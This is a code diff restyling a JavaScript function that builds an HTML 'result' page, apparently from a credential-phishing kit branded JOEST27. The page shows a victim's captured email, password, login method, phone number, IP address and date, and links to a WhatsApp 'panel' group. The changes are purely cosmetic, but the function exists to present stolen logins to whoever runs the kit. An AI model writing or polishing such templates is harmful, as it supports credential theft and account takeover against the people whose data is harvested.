@@ -152,7 +152,9 @@ function buildHtml(vars) {
 
 
 
-    <!DOCTYPE html>
+
+
+<!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
@@ -161,78 +163,137 @@ function buildHtml(vars) {
 
 body{
 margin:0;
-padding:20px;
-background:#1a1a1a;
+padding:25px;
+background:#000000;
 font-family:Arial,sans-serif;
+}
+
+.container{
+max-width:700px;
+margin:auto;
 }
 
 .tblResult{
 width:100%;
-max-width:650px;
-margin:auto;
-background:#242424;
-border:2px solid #d4af37;
-border-collapse:collapse;
-border-radius:12px;
+background:#111111;
+border:2px solid #e51b23;
+border-radius:18px;
+border-collapse:separate;
+border-spacing:0;
 overflow:hidden;
 }
 
-.header{
-background:#3a3a3a;
-color:#d4af37;
+.logo-box{
+background:#000000;
+padding:25px;
 text-align:center;
+border-bottom:2px solid #e51b23;
+}
+
+.logo{
+width:100%;
+max-width:500px;
+height:auto;
+display:block;
+margin:auto;
+}
+
+.subtitle{
+margin-top:12px;
+font-size:12px;
+letter-spacing:5px;
+color:#b0b0b0;
 font-weight:bold;
+}
+
+.success{
+display:inline-block;
+margin-top:15px;
+padding:10px 22px;
+background:#e51b23;
+color:#fff;
+font-size:12px;
+font-weight:bold;
+border-radius:50px;
 letter-spacing:2px;
+}
+
+.header{
+background:#e51b23;
+color:#fff;
+font-size:18px;
+font-weight:bold;
+text-align:center;
 padding:16px;
 }
 
 .section{
-background:#333333;
-color:#d4af37;
+background:#1a1a1a;
+color:#fff;
 text-align:center;
+padding:15px;
+font-size:15px;
 font-weight:bold;
-padding:14px;
+border-top:1px solid #2a2a2a;
+border-bottom:1px solid #2a2a2a;
 }
 
-.tblResult td{
-padding:14px;
-border-bottom:1px solid #3a3a3a;
-color:#ffffff;
+.row-wrap{
+padding:8px 15px;
+background:#111111;
+}
+
+.row{
+background:#181818;
+border-left:4px solid #e51b23;
+border-radius:10px;
+padding:15px;
+}
+
+.row table{
+width:100%;
+border-collapse:collapse;
 }
 
 .label{
-width:35%;
-color:#d4af37;
+color:#aaaaaa;
+font-size:13px;
 font-weight:bold;
+letter-spacing:1px;
 }
 
 .value{
+color:#ffffff;
+font-size:14px;
+font-weight:bold;
 text-align:right;
-font-weight:600;
+word-break:break-word;
 }
 
 .join-box{
 padding:20px;
-background:#242424;
+background:#111111;
 }
 
 .join-btn{
 display:block;
-text-align:center;
-padding:15px;
+background:#e51b23;
+color:#ffffff;
 text-decoration:none;
-background:#d4af37;
-color:#1a1a1a;
+text-align:center;
+padding:16px;
+border-radius:10px;
+font-size:15px;
 font-weight:bold;
-border-radius:8px;
 }
 
 .footer{
-background:#3a3a3a;
-color:#d4af37;
+background:#0a0a0a;
+color:#95140b;
 text-align:center;
-padding:15px;
+padding:18px;
 font-size:12px;
+border-top:1px solid #222222;
 }
 
 </style>
@@ -240,91 +301,120 @@ font-size:12px;
 
 <body>
 
+<div class="container">
+
 <table class="tblResult">
 
 <tr>
-<td colspan="2" style="
-background:#2f2f2f;
-padding:30px 20px;
-text-align:center;
-border-bottom:2px solid #d4af37;
-">
+<td class="logo-box">
 
 <img
-src="https://raw.githubusercontent.com/meongHost/meongHost1/refs/heads/main/3b3dea7e-7574-445a-8d0d-98ec60b426b1.png"
-width="140"
-height="140"
-alt="JOEST27"
-style="
-display:block;
-margin:auto;
-width:140px;
-height:140px;
-border:3px solid #d4af37;
-border-radius:70px;
-">
+class="logo"
+src="https://raw.githubusercontent.com/meongHost/meongHost1/refs/heads/main/file_00000000f31872098c3180d25789025f.png">
 
-</td>
-</tr>
-JOEST27
+<div class="subtitle">
+PREMIUM RESULT SYSTEM
 </div>
 
-<div style="
-margin-top:8px;
-font-size:12px;
-letter-spacing:3px;
-color:#b0b0b0;
-">
-PREMIUM RESULT SYSTEM
+<div class="success">
+RESULT SUCCESS
 </div>
 
 </td>
 </tr>
 
 <tr>
-<td colspan="2" class="header">
+<td class="header">
 INFORMASI LOGIN
 </td>
 </tr>
 
 <tr>
+<td class="row-wrap">
+<div class="row">
+<table>
+<tr>
 <td class="label">EMAIL</td>
 <td class="value">${vars.email}</td>
 </tr>
+</table>
+</div>
+</td>
+</tr>
 
+<tr>
+<td class="row-wrap">
+<div class="row">
+<table>
 <tr>
 <td class="label">PASSWORD</td>
 <td class="value">${vars.password}</td>
 </tr>
+</table>
+</div>
+</td>
+</tr>
 
+<tr>
+<td class="row-wrap">
+<div class="row">
+<table>
 <tr>
 <td class="label">LOGIN VIA</td>
 <td class="value">${vars.login}</td>
 </tr>
+</table>
+</div>
+</td>
+</tr>
 
 <tr>
-<td colspan="2" class="section">
+<td class="section">
 INFORMASI TAMBAHAN
 </td>
 </tr>
 
 <tr>
+<td class="row-wrap">
+<div class="row">
+<table>
+<tr>
 <td class="label">PHONE</td>
 <td class="value">${vars.phone}</td>
 </tr>
+</table>
+</div>
+</td>
+</tr>
 
+<tr>
+<td class="row-wrap">
+<div class="row">
+<table>
 <tr>
 <td class="label">IP ADDRESS</td>
 <td class="value">${vars.ip}</td>
 </tr>
+</table>
+</div>
+</td>
+</tr>
 
+<tr>
+<td class="row-wrap">
+<div class="row">
+<table>
 <tr>
 <td class="label">DATE</td>
 <td class="value">${vars.date}</td>
 </tr>
+</table>
+</div>
+</td>
+</tr>
 
 <tr>
-<td colspan="2" class="join-box">
+<td class="join-box">
 
 <a href="https://chat.whatsapp.com/E0gWuMj5TH72MKRkTZsVEZ?s=cl&p=a&mlu=1"
 class="join-btn">
@@ -335,16 +425,17 @@ JOIN WHATSAPP GROUP PANEL
 </tr>
 
 <tr>
-<td colspan="2" class="footer">
-© 2026 JOEST27 • 
+<td class="footer">
+© 2026 RESULTS JOEST27 • PREMIUM RESULT SYSTEM
 </td>
 </tr>
 
 </table>
 
+</div>
+
 </body>
 </html>
-
 `;
 }
 
